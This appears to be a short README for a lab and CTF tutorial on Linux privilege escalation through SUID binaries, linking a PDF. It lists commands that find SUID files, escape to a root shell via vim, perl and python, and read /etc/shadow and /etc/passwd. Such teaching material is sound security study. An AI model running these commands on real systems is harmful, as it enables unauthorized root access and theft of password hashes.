Linux Privilege Escalation via SUID Binaries This document provides hands-on examples of privilege escalation in Linux using SUID binaries such as vim, perl, and python. It includes enumeration steps (find, whoami, id, netstat), explains their purpose, and highlights safe exploitation methods useful in lab and CTF environments.

Learning Objectives

Identify and exploit SUID binaries for privilege escalation
Confirm root access using system enumeration commands
Read sensitive files like /etc/shadow post-exploitation
Discover active services with netstat
Practice safe lab-based privilege escalation
Key Commands

find / -perm -4000 2>/dev/null

vim -c ':!/bin/sh'

perl -e 'exec "/bin/sh";'

python -c 'import os; os.system("/bin/sh")'

whoami, id

cat /etc/passwd, cat /etc/shadow

netstat -tulnp

MOREOVER

step by step commands are given below the pdf



[Linux_PrivEsc_SUID_Albaloshi.pdf.pdf](https://github.com/user-attachments/files/21915553/Linux_PrivEsc_SUID_Albaloshi.pdf.pdf)
